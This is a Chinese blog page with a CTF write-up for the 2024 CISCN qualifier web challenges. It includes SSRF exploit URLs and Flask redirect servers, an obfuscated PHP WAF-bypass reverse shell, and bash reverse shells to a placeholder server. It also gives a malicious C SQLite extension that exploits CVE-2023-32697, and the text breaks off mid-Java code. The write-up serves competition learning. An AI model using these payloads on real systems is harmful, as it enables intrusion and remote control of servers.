@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="s3ven&#39;s blog" />
+  
+  
+  
+  <title>
+    
+      2024 CISCN Qual WriteUp 
+      
+      
+      |
+    
+     s3ven&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">2024 CISCN Qual WriteUp</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+          2024-05-19
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="../../categories/write-up/" title="Write Up">
+                    Write Up
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/php/" title="PHP">
+                    #PHP
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="../../tags/java/" title="Java">
+                    #Java
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <blockquote>
+<p>差一道题就能AK所有Web了，有点可惜</p>
+</blockquote>
+<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p><code>/flag.php</code> 下存在代码要求访问来源为 <code>127.0.0.1</code> 来实现 RCE ，猜测考点为 <code>ssrf</code></p>
+<p>在 迅睿cms 官网搜索 ssrf 漏洞：<br><img src="image-1.png" alt="image-1.png"></p>
+<p>发现 qrcode 模块存在 ssrf 漏洞，可以伪造服务端请求</p>
+<p>跟进 qrcode api 代码：<br><img src="image-2.png" alt="image-2.png"></p>
+<p>跟进 dr_catcher_data：<br><img src="image-3.png" alt="image-3.png"></p>
+<p>发现确实存在 SSRF 漏洞，故调用 api 触发漏洞：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xxxx</span><span class="token punctuation">></span></span>.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=123&amp;thumb=http://127.0.0.1/flag.php?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>%2f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listen_port</span><span class="token punctuation">></span></span>+0%3e%261%22</code></pre>
+
+<p>发现直接访问好像不行，使用vps来301转发请求：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/flag.php?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f&lt;server_ip>%2f&lt;listen_port>+0%3e%261%22"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">301</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token operator">&lt;</span>redirect_port<span class="token operator">></span><span class="token punctuation">)</span></code></pre>
+
+<p>修改 api 调用语句：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xxxx</span><span class="token punctuation">></span></span>.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=123&amp;thumb=http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>redirect_port</span><span class="token punctuation">></span></span></code></pre>
+
+<p>成功反弹 shell 获得 flag</p>
+<h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>在 <code>easy_cms</code> 的基础上增加了对目标 <code>url</code> 文件类型的检测</p>
+<p>如果目标 url 为图片则调用 <code>dr_catcher_data</code> 读取</p>
+<p><img src="image-4.png" alt="image-4.png"></p>
+<p>因此只需要服务端在调用 <code>getimagesize</code> 第一次访问 url 时返回正常的图片通过检测，在调用 <code>dr_catcher_data</code> 第二次访问 url 时返回 301 重定向即可绕过检测实现 ssrf</p>
+<p>服务端 Python 代码如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_file
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+visit_count <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> visit_count
+    
+    <span class="token keyword">if</span> visit_count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        visit_count <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'image.png'</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span>
+        
+    <span class="token keyword">elif</span> visit_count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        visit_count <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/flag.php?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f&lt;server_ip>%2f&lt;listen_port>+0%3e%261%22"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">301</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"You have already visited twice."</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8989</span><span class="token punctuation">)</span></code></pre>
+
+<h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><p>反弹shell命令：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i >&amp; /dev/tcp/&lt;server_ip>/&lt;listen_port> 0>&amp;1"</span></code></pre>
+<p>php system() 命令执行 绕过waf：</p>
+<pre class="language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span><span class="token class-name type-declaration">r</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$h</span><span class="token operator">=</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$h</span><span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>拿到 shell 后不难发现容器中存在 mysql 且根目录下没有 flag</p>
+<p>故猜测 flag 在 mysql 数据库里，使用如下命令获取 tty ：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">script /dev/null <span class="token parameter variable">-c</span> /bin/bash</code></pre>
+<p>然后连接 mysql 即可获得数据库中的 flag ：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span></code></pre>
+<p>账号密码均为 root</p>
+<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><code>pom.xml</code> 中给出了 <code>sqlite</code> 的依赖如下：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.xerial<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>sqlite-jdbc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.8.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
+<p>查找 <code>mvnrepository</code> 发现 <code>sqlite-jdbc:3.8.9</code> 存在 <code>CVE-2023-32697</code> 漏洞<br><img src="image-5.png" alt="image-5.png"><br>该漏洞的利用需要满足 jdbcUrl 和 sql 语句同时可控，并且需要开启 <code>LoadExtension</code></p>
+<p>而 <code>com.example.jdbctest.utils.sql.SqliteDatasourceConnector</code> 中开启了 <code>LoadExtension</code><br><img src="image-6.png" alt="image-6.png"><br><code>getTableContent</code> 中由于 <code>tableName</code> 可控，可以实现 sql 注入<br><img src="image-7.png" alt="image-7.png"><br>而 <code>jdbcUrl</code> 由前端传入，也是可控的<br><img src="image-8.png" alt="image-8.png"><br>因此符合漏洞利用条件</p>
+<p>首先先在本地创建一个 <code>sqlite.db</code> 用于后续 sql 注入</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sqlite3
+
+conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'sqlite.db'</span><span class="token punctuation">)</span>
+
+cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+    CREATE TABLE IF NOT EXISTS user (
+        username TEXT NOT NULL,
+        password TEXT NOT NULL
+    )
+'''</span><span class="token punctuation">)</span>
+
+conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Database and user table created successfully."</span><span class="token punctuation">)</span></code></pre>
+<p>然后构造恶意 extension <code>ext.so</code>：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// ext.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sqlite3ext.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dirent.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
+SQLITE_EXTENSION_INIT1
+
+<span class="token keyword">int</span> tcp_port <span class="token operator">=</span> <span class="token operator">&lt;</span>listen_port<span class="token operator">></span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> <span class="token operator">*</span>ip <span class="token operator">=</span> <span class="token string">"&lt;server_ip>"</span><span class="token punctuation">;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_WIN32</span></span>
+<span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+
+<span class="token keyword">int</span> <span class="token function">sqlite3_extension_init</span><span class="token punctuation">(</span>
+  sqlite3 <span class="token operator">*</span>db<span class="token punctuation">,</span> 
+  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>pzErrMsg<span class="token punctuation">,</span> 
+  <span class="token keyword">const</span> sqlite3_api_routines <span class="token operator">*</span>pApi
+<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> rc <span class="token operator">=</span> SQLITE_OK<span class="token punctuation">;</span>
+  <span class="token function">SQLITE_EXTENSION_INIT2</span><span class="token punctuation">(</span>pApi<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> addr<span class="token punctuation">;</span>
+    addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
+    addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>tcp_port<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">connect</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">return</span> rc<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>安装 <code>sqlite-dev</code> 包并编译：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libsqlite3-dev
+gcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> ext.c <span class="token parameter variable">-o</span> ext.so</code></pre>
+<p>在 vps 上使用 python 开启文件服务</p>
+<pre class="language-none"><code class="language-none">python3 -m http.server &lt;file_port&gt;</code></pre>
+
+<p>然后构造 jdbcURL 来将 sqlite.db 和 ext.so 放入靶机缓存文件</p>
+<pre class="language-none"><code class="language-none">jdbc:sqlite::resource:http:&#x2F;&#x2F;&lt;server_ip&gt;:&lt;file_port&gt;&#x2F;sqlite.db
+jdbc:sqlite::resource:http:&#x2F;&#x2F;&lt;server_ip&gt;:&lt;file_port&gt;&#x2F;ext.so</code></pre>
+
+<p>利用 <code>hashcode()</code> 漏洞计算 <code>/tmp</code> 下的文件名</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span>  
